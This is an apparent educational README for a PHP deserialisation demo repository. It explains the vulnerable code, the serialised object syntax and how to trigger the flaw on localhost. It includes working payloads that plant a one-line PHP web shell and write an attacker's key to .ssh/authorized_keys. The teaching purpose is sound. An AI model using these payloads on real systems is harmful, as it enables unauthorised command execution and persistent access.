# Deserialisation Demo
I wrote this demo for our [Advanced Web Hacking](https://shefesh.com/assets/wiki/Advanced%20Web%20Hacking%20-%20PDF.pdf) session.

It is a demo of a very simple PHP Deserialisation Vulnerability. You can view more about Deserialisation in the slides linked above.

## Demo Code

The repository is available at: [https://github.com/Twigonometry/Deserialisation-Demo](https://github.com/Twigonometry/Deserialisation-Demo)

### The Vulnerable Code

#### unsafe.php

This represents a simple web application that constructs a `SignupForm` object and writes to a file when the `__destruct()` [magic method](https://www.php.net/manual/en/language.oop5.magic.php) is called. It accepts the GET parameter `username`, which it uses to write a username to a list of users who have signed up. It does this using the class' `parse_username()` and `__destruct()` functions.

#### The Vulnerability

The class variables `$outfile` and `$username_string` are normally set by the `parse_username()` method. However, an attacker can craft a `SignupForm` object manually and set these variables to whatever they like. If this is passed to the `username` GET parameter it is deserialised and the `__destruct` method is automatically called. This skips the `parse_username()` method and overrides the variables, meaning their attacker-controlled values are used in the `file_put_contents()` call.

The vulnerability only exists because untrusted data (i.e. user input) is passed directly to the `unserialize()` function. Remove this line, and the vulnerability is fixed. In fact, it's not even needed to make this program work - it is there just to teach about the mechanics of the vulnerability, but there may be situations where `unserialize()` may have a genuine use case - for example, frameworks like Laravel serialise PHP Objects that represent users. In this case, developers must ensure that no untrusted data is involved in this deserialisation, either directly or 'upstream' when data is passed from a database or similar connected service.

### The Exploit

#### generate-object.php

This is a recreation of the class being used on the web application, as could be created by an attacker with a 'whitebox' view of the web app's `unsafe.php` file.

It creates an instance of the class, with preset values that are used when the object is deserialised. The `$username_string` variable determines the contents that will be written to the file, and the `$outfile` variable determines the path (within the web server's directory). Change these to change the behaviour of your payload.

By default, the object looks like this:

```
O:10:"SignupForm":2:{s:7:"outfile";s:10:"gotcha.txt";s:15:"username_string";s:25:"malicious stuff goes here";}
```

The syntax is as follows:
- `O` tells us the type is an 'object'
- `10` tells us the character length of the class name `SignupForm`
- `2` tells us the number of variables within the object
- Within the curly brackets `{ }` are the object variables. They follow a similar structure, with each one having a type (`s` meaning 'string'), a variable name and length (`7:"outfile"`), and a value (a string (`s`), `10` characters long, called `"gotcha.txt"`). The variable names and values, and each pair thereof, are separated by semicolons `;`.

This will write the string "malicious stuff goes here" to the `gotcha.txt` file. Pretty harmless, but it should show you how the exploit works!

You can, of course, create these manually - but counting the length of a load of variable names is a pain and it's easy to make a syntax mistake!

#### Triggering the Attack

A serialised object must be generated (see `generate-object.php`) and then passed to the `username` GET parameter. To test this locally, run your webserver:

```
$ php -S localhost:5000
```

Change your payload by editing the `$username_string` and `$outfile` variables in `generate-object.php`, then make a request to get your object:

```
$ curl localhost:5000/generate-object.php
```

Then make a request to the page, passing your object to the `username` GET parameter:

```
http://localhost:5000/unsafe.php?username={SERIALISED OBJECT HERE}
```

*Note:* If you use curl, bash may throw a fit at your curly brackets. You can either visit the URL in your browser, or use the `--globoff` flag to [escape the brackets](https://stackoverflow.com/questions/8333920/passing-a-url-with-brackets-to-curl)

Here is the request we made, using our malicious object:

```
http://localhost:5000/unsafe.php?username=O:10:"SignupForm":2:{s:7:"outfile";s:10:"gotcha.txt";s:15:"username_string";s:25:"malicious stuff goes here";}
```

The `gotcha.txt` file should now appear in the webserver directory!

*Another Note:* Remember, anything you put in your payload happens on *your* machine - if someone monitors your installation directory for naughty `.txt` files and you write something you shouldn't have, don't come crying to us.

#### Exploit Payloads

Our example exploit writes something fairly harmless to `gotcha.txt`, demonstrating the vulnerability. However, there are lots of ways to exploit arbitrary file write, even within the constraints of the current directory. Here are a couple of examples:

**Write a Web Shell**

This won't necessarily allow you to escalate priveleges, but it lets you perform more actions on the box besides writing to files. You will have the permissions of the user who is running the web server (don't run your web servers as root!)

Here's the serialised object for a cheeky one-line PHP shell:

```
O:10:"SignupForm":2:{s:7:"outfile";s:7:"cmd.php";s:15:"username_string";s:29:"<?php system($_GET['cmd']);?>";}
```

If you're editing the `$username_string` variable here, you may need to escape the `$` character as follows: `public $username_string = "<?php system(\$_GET['cmd']);?>";`

**Write an SSH key**

The file location is limited by the `__DIR__` prefix. However, if for some ungodly reason this webserver was hosted in a user's home directory, a payload such as the following could write an SSH key to the `.ssh/authorized_keys` file. Like the above, this doesn't escalate your priveleges but grants you a more interactive shell.

Here's the object:

```
O:10:"SignupForm":2:{s:7:"outfile";s:20:".ssh/authorized_keys";s:15:"username_string";s:20:"YOUR ID_RSA.pub HERE";}
```

I shouldn't have to say this, but "YOUR ID_RSA.pub HERE" is not a valid SSH key. If you want this to work, make sure to replace it (ideally in the `generate-object.php` file itself, so it calculates the length for you)

## Acknowledgements

Thanks to a recent Hack the Box for the inspiration... I won't say which, as it's live! But now you know how this works, go out and find it and root it...

# Tags

#project #deserialisation #web 